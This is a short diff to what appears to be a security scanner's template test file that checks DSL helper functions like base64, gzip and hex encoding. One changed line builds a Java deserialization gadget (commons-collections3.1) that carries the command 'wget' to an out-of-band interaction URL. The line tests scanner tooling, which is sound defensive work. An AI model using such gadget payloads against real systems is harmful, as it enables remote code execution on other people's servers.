@@ -20,7 +20,7 @@ requests:
         03: {{base64_decode("SGVsbG8=")}}
         04: {{base64_py("Hello")}}
         05: {{contains("Hello", "lo")}}
-        06: {{generate_java_gadget("commons-collections3.1", "wget h}}
+        06: {{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
         07: {{gzip("Hello")}}
         08: {{hex_decode("6161")}}
         09: {{hex_encode("aa")}}
